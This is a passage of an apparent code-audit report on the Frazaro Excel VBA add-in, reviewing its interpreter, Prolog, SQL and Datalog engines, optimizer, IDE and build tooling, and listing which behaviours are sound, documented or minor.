- `EmitForEachRow` puts `Dim vlaSlab*` inside a possible outer loop: harmless, because each variable is reassigned before use, unlike #1.
- The interpolate compile path emits a key's expression once per hole, so `"{x} {x}"` evaluates `x` twice. That only matters for side-effecting expressions: noted, not filed.

### Interpreter and runtime

- The `TakeRunSnapshot` rollback (U.19) removes everything it made before raising; the error path restores ScreenUpdating and DisplayAlerts. Sound.
- A partial restore in `PutBackLastRun` is documented (U.21) and rolls back the sheet it was on. Sound as designed.
- `ExecStmtTrapped` confines On Error Resume Next to one statement and reads Err before `On Error GoTo 0`. Correct.
- `VlaDictGet`/`VlaDictSet`/`VlaPairValue` branch Set vs Let per item. Correct. `VlaDictIsFallback` avoids the TypeOf-on-Nothing trap.
- `RaiseRuntimeMsg` builds the catalogue on each call; `RuntimeSubstituteSlots` is not quadratic enough to matter.
- `VlaColor`'s error path (`On Error GoTo bad` followed by a raise inside the handler) propagates correctly.
- `VlaFilterCriterion`/`InvariantNumber` use `Str$`, so they are locale-invariant. Wildcard escaping is done in the right order.
- `VlaTextPad` bounds width to 0..32767 before `CLng`/`String$`. Safe.
- `VlaNumberFormatCode` uses `IsNumeric`/`CDbl` on a runtime value, not source text, the same as compiled VBA. Acceptable.
- `RewriteTextCell` applies the SEC.4 rule and the post-write VarType check. Sound.
- `FindPivotTableByName` guards each probe separately. Fine.
- `ExecForEachRow` gives the same all-or-nothing commit as the compiled side on return, goto and break (it is only the write-back content that is wrong; see F4).
- `CallUserProc` saves and restores the handler state on success. The error-path gap is documented (IN3.6).
- The `HelperManifestCached` module cache does not cache failure, and the manifest cannot change within a session. Fine.
- `VlaFrame.cls` is a plain data bag with no behaviour. Nothing to report.
- `VlaTrimSheet`'s delete loop was already flagged in-file (TER-4). Not re-reported.
- `RuntimeSourceText` tier 2 builds its string by concatenation, cell by cell: about 2.6k lines at O(n²). Measurable but minor (low perf). Not raised as a finding.

### PROLOG

- Occurs check: present in `UnifyTwoWay`/`EnvOccurs`, so no cyclic terms can form. It *raises* instead of failing, which is a documented decision (PROLOG.2, "refused by name").
- Standardising apart: the `#<step>` suffix is unique for the whole query, because `stepsTaken` is shared ByRef into `SolveIsolated`. Re-freshening an already-suffixed name (`X#3#9`) stays unique. A user variable literally named `X#5` could collide, which I judged not worth filing.
- Cut opacity: `not`/`findall` get a local cut signal (`SolveIsolated`), which is correct. Cut in `or` branches is transparent, which is correct. Cut in an `if` condition is transparent, a documented divergence from ISO. The "first wins" guard on nested cut signals (PROLOG.14) traces correctly.
- `between`: the empty range yields nothing, the range cap is `PROLOG_MAX_WORK - 1` with the right off-by-one, test mode is value-based, and non-whole bounds are refused.
- `length`/`member`/`nth`/`append` with an unbound or partial list: refused by name, a documented choice (PROLOG.13). `append` split mode is O(n²) but capped at 1,000 items.
- Text numbers in arithmetic (`(> "42" 41)` succeeds while `(number? "42")` is false): adjudicated in BETA_REARVIEW around line 15286.
- Blank cells become empty text (`"`), which makes arithmetic on them refuse by name. That is acceptable, apart from the `not` amplification in finding 2.
- `mDepth` left counted in after a raise: zeroed in `PrologRun`. Every exit from `SolveGoalList` goes through `leave:`, enforced by `check_prolog_budgets.ps1`.
- User-written list recursion dies at about 60 elements because of `PROLOG_MAX_DEPTH`: known and documented (PROLOG.28, "a chain deeper than PROLOG follows"), and an accepted risk under SEC.14.
- Table arity mismatch and first-argument indexing: already filed as PROLOG.25 and PROLOG.29.
- `Dim ... As New Collection` in `SolveGoalList`/`SolveIsolated`: these are per-frame and not inside loops, so they are safe.

### SQL and DATALOG

- Datalog stratification (ComputeStrata): Bellman-Ford relaxation for nPreds passes plus a verification pass correctly rejects any cycle through `not`/`count`/`sum`/`textjoin`. Comparison, let and text items correctly contribute no edge.
- Semi-naive loop (RunFixpointForRules/RunOneRulePass): delta at one BI_POS position, full relations elsewhere, new tuples deduped by RelTryAdd before entering newDeltas. Correct, including mid-round mutation, because EvalRuleBody finishes before `full` is mutated and FilterAtomRelation returning `rel` itself is read-only.
- Datalog safety (CheckRuleSafety): head, negation, built-in and aggregate variable binding is written-order and complete. Variable names compare case-insensitively (VlaDictNew) by design (SameVariableName).
- Datalog 1 vs "1" vs 1.0: 1 (cell) and "1" (fact) are one value and "1.0" is different. This is the documented spelling identity (Relation header, OPTIMIZE.3). Only its locale dependence is reported (finding 2).
- SQL join with duplicate rows: RelWrapBag plus RelJoin keep the bag, so duplicate matches multiply as in SQLite. RangeToRows keeps duplicate rows.
- Merge sort stability (MergeSortRange `<= 0` prefers the left run): stable for a transitive comparator. The instability only comes from finding 5.
- LIMIT 0, LIMIT without ORDER BY, and ORDER BY a non-selected column all behave as SQLite does. OFFSET and `LIMIT a, b` are refused by the generic leftover-token refusal (a documented subset).
- `''` string escape in Tokenize is correct, including `''` at the end of the text. An unterminated string or comment is refused by name.
- COUNT(col) counting blanks, SUM/AVG refusing a blank as non-numeric, blanks in WHERE: all SQL.9.
- SUM over zero rows = 0 (SQLite gives NULL) and MIN/MAX/AVG over zero rows refused: documented choices (SQL.4 and Relation headers).
- All-blank source rows are dropped from SQL tables: known and documented (BETA_REARVIEW ~9663, ~17573).
- The `As New` in-loop trap: every loop-scoped Collection in SqlRunJoin, EvalCteBody, SqlRunWith, RangeColumnNames and ParseAtom uses explicit `Set = New`. `Dim pair As New Collection` in JoinIndexPut is per-call, not per-loop, so it is safe.
- Recursive CTE: UNION ALL only, shape checks, round ceiling, delta substitution through a fresh table record each round. Correct. UNION (dedup) recursion is refused (documented shape).
- Set-op precedence (INTERSECT tighter, others left-associative) and result headers from the first branch match SQLite.
- Mac fallback paths (Collection-scan join index, RelTryAdd linear scan): O(n²) but documented, and not in the SQL hot path on Windows.

### OPTIMIZE

- Search soundness: chronological backtracking with a flipped decision at level-1, `mNext = d + 1`, and the undo of processed-vs-queued counts (UndoTo, `p < mQHead`) are consistent. The first world found is the lexicographically first world with TRUE tried before FALSE, as documented.
- Unsatisfiable vs budget: a level-0 conflict gives NONE (NO_SCHEDULE), and a budget stop at any level greater than 0 gives BUDGET (NONE_IN_BUDGET). The budget check comes after the FOUND check. Work never exceeds the budget. OptimizeAnswerOf spills the same empty shape for both on purpose, and STATUS tells them apart.
- Budget/work counters are Long, bounded by an effort of at most 2^31-1. They cannot overflow.
- The guard's Timer midnight wrap is corrected (+86400) at both reads. The guard is read every 256 work units, and each loop iteration adds exactly one unit.
- Empty choice sets: zero atoms gives FOUND with 0 decisions. A group with no members and lo > 0 is caught by PoolShortReason before the search. A (per ...) with no rows gives no counters. choose-any has no counter.
- Duplicate members inside one counter cannot occur: the integer grounder keeps a rule head's first occurrence, and members of one group share the group columns, so distinct rows mean distinct atoms. ProblemIsWellFormed would report BAD_PROBLEM anyway.
- CapShortReason (the pigeonhole proof) is sound: the demand side needs disjoint groups, the capacity side needs a uniform literal cap and coverage of every unpruned demand atom. Its Long products (`members * cap`, `groups * cap`) are only computed when they are below a demand of at most 2^31-1, so they cannot overflow.
- choose-between with data where lo > hi becomes "no schedule" through RootSeed's counter conflict, naming the form and group. A literal inverted range is refused instead (optimize-choose-range-inverted). The two paths differ, but both give honest words. Not a bug.
- Group and member order (the Table-order tie-break): members stay in pool order within a group whichever side the join builds on, and multi-atom (per ...) groups are re-sorted by rank vectors with a stable merge sort.
- Run-mode state (mForCommand, ceilings, guard) leaking after a command raises or Esc is pressed: harmless, because OptimizeRun always calls SetRunMode False before RunOnce, and a memo hit reads none of it.
- Re-entrancy: there is no DoEvents, Application.Volatile or Calculate anywhere in either module, and VLA_Datalog has one handler (its UDF). A recalculation cannot re-enter a search, and Esc (error 18) in the command is not swallowed by a callee's handler.
- The Esc/status-bar/EnableCancelKey restore in VlaOptimizeCell covers both exits. WriteCommandSheet restores ScreenUpdating and DisplayAlerts and deletes its half-written sheet on failure.
- EvaluateArg's `On Error Resume Next` is confined to two Evaluate calls. A non-range result is evaluated twice (the first `Set` fails), which is harmless for the user's own argument text.
- Memo FIFO eviction at OPT_MEMO_CAP = 16: a workbook with more than 16 distinct questions gets a 0% hit rate on a full recalc (FIFO plus cyclic access). The effect is only lost speed, never a wrong answer. Low; not filed as a finding.
- The command can write more than 1,048,576 rows (no total ceiling), which fails inside writeFailed as optimize-command-failed carrying Excel's raw text. This is cleaned up correctly; low.
- `stats(9) = CLng(gr.rowsLaid)` in a command has no total ceiling, but reaching 2^31 laid-out rows is not physically reachable before memory runs out.

### Host, IDE and build

- Message catalogue: 565 ids, no duplicates (AddMsg also raises on a duplicate), and every id is referenced outside the catalogue (the only 2 without a quoted literal are built dynamically). Slot arity is already ratcheted by check_message_slots.ps1.
- Ribbon re-entrancy during a run: nothing in VLA_IDE, VLA_Interpreter or VLA_Runtime calls DoEvents, and program MsgBox/InputBox are application-modal, so a ribbon or CLI click cannot land mid-run. The only re-entrancy path is Excel events (findings 2 and 3).
- The ScreenUpdating/DisplayAlerts brackets in TakeRunSnapshot, PutBackLastRun, EnglishIdeUndo, DeleteSnapshots and RemoveSnapshotSheets all save and restore on every path, including the failure handlers. RunProgram and InterpretProgram force ScreenUpdating back to True rather than restoring it, which is intended (a documented V1 decision).
- StatusBar in ReadWordFile is reset to False on both paths. Word COM cleanup is sound: a Word instance that is not ours is refused before anything is touched, and ours is quit in cleanup.
- CaptureHost/HostBook (D1): one ActiveWorkbook read per command, with a dead-handle re-capture. There is no ThisWorkbook/ActiveWorkbook confusion in VLA_IDE: ThisWorkbook is used only for add-in paths and the trust probe.
- VlaButtonClickDispatch using ActiveWorkbook: a Form button can only be clicked in the front window, so this is acceptable.
- Console history (%APPDATA%\Frazaro\history.txt): capped at 500 on load, tail read limited to 2 MB, UTF-8, secret-word filter, and a silent read failure. Within one session the file grows without a cap until the next load's tidy-up rewrites it. That is minor. A single command larger than 2 MB would make the tidy-up rewrite an empty file, but that is theoretical.
- ScheduleSelfDelete's ANSI `.ps1`: U.20 considered it and called it "consistent". The residual risk is a path character outside the system code page (for example "ł" on a cp1252 machine), which makes the self-delete fail silently. Recorded here as a known residual, not re-reported.
- VLA_Build's module list against VLA_DevRig: already ratcheted (check_devrig_mods_parity.ps1). Phrasebook embedding order, VLAe_Name and the prelude candidate order match their readers.
- VLA_Build's temp export/import through `%TEMP%\<module>.<ext>` with fixed names: an attacker running as the same user gains nothing new. Import prefers `.bas` over a stale `.cls`/`.frm` of the same name, which only matters if a stale file exists. Benign.
- DeleteSnapshots' orphan sweep correctly spares other live programs' tags (U.22/U.23). Growth is bounded to one snapshot set per program tag. The problem is keeping them, not their number (finding 5).
- LogParseFailure keeps at most 2000 rows (trimmed to the newest 1000).
- frmCLI's Win32 declares are PtrSafe with LongPtr handles. GetWindowLong/SetWindowLong returning Long is correct for GWL_STYLE.

### Tooling and supply chain

- Every `tools/check_*.ps1` exits non-zero when it crashes: under `-File`, a parse error, a `throw` and a `Stop`-mode cmdlet error each gave exit 1 (tested with pwsh). No check has a catch-all that swallows into exit 0.
- `check_no_network`, `check_raise_ratchet`, `check_no_vba_advice`: the shipped-module list comes from `VLA_Build.bas:413 mods = Array(...)` and refuses zero or missing modules. No vacuous path.
- `check_prolog_budgets`, `check_datalog_per_tuple_alloc`, `check_vladict_guard`, `check_sec9_phrasebook_gate`: named procedures or files fail loudly when missing.
- `check_hash_twin.ps1:185` `Invoke-Expression`: runs a function body regex-lifted from a sibling repo script. Repo-controlled input, and the script fails when the function is not found.
- `build_examples.ps1`: no Office automation, XML text goes through `SecurityElement.Escape`, numbers use InvariantCulture. The sheet passwords ("close") are documented sample content, not secrets.
- Secrets: no tokens, keys, passwords or network calls in tools/ or installer/. The certificates live in `Cert:\CurrentUser\My`, not in files.
- Frazaro.iss: per-user (`PrivilegesRequired=lowest`, `{userappdata}`), no `[Run]`/`[UninstallRun]`, does not touch Trust Center or trusted locations. The user-writable install dir and the external `prelude.vla`/`english.vla` overriding the embedded copies are SEC.16 (accepted, not reported).
- Uninstall leaves `HKCU\Software\VB and VBA Program Settings\Frazaro`: already written up in BETA_REARVIEW.md:2080-2084 (SIG.1 notes). Not re-reported beyond a pointer in finding 6.
- `toggle_vba_warning_level.ps1`: state file in `%TEMP%` (predictable name, but a same-user attacker already owns HKCU). It hardcodes Office 16.0 and refuses cleanly otherwise. It restores only via `-Restore`, and a lost state file is reported, not guessed. Dev-only. Acceptable.
- Phrasebooks: no `raw` forms in prelude.vla, english.vla or espanol.vla. `check_rule_coverage` shows 0 english rules with zero tests. All 19 espanol-vla rules are each followed by a test-success, although no static check covers espanol.vla (rule_coverage is English-only; an add-on for the next audit). The espanol `keyword-alias` global rewrite of `si`/`es`/`veces` is documented in the file itself (espanol.vla:210-231) as a known collision class.
- `release.ps1` signature status accepting `UnknownError`/`NotTrusted` is correct for a self-signed cert (the identity problem is finding 9, not the status).
